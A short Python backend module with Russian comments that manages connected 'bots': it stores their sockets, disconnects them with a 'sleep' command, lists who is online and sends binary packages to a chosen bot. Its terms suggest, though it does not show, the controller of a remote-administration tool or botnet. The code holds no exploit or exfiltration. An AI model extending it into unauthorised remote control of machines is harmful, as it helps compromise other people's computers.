# backend/Services/ClientManager.py
import asyncio, backend.LoggerWrapper as logger
from .network import pack_packet

# Глобальное состояние
active_clients, preview_cache = {}, {}

async def close_client(bid, send_sleep=True):
    "Завершение сессии бота"
    if not (s := active_clients.pop(bid, None)): return False
    reader, writer = s
    try:
        if send_sleep: writer.write(b"sleep\n"); await writer.drain()
        writer.close(); await writer.wait_closed()
    except: pass
    finally: logger.Log.info(f"[Manager] {bid} disconnected")
    return True

async def close_all_clients():
    "Массовое отключение"
    if not active_clients: return 0
    res = await asyncio.gather(*[close_client(bid) for bid in list(active_clients.keys())])
    return len(res)

def list_clients():
    "Список онлайн-клиентов"
    return [{"id": bid, "status": "online"} for bid in active_clients]

async def send_binary_to_bot(bid, pkg):
    "Отправка данных боту"
    if not (s := active_clients.get(bid)): return False
    try:
        s[1].write(pkg); await s[1].drain(); return True
    except Exception as e:
        logger.Log.error(f"[Manager] Send err {bid}: {e}"); return False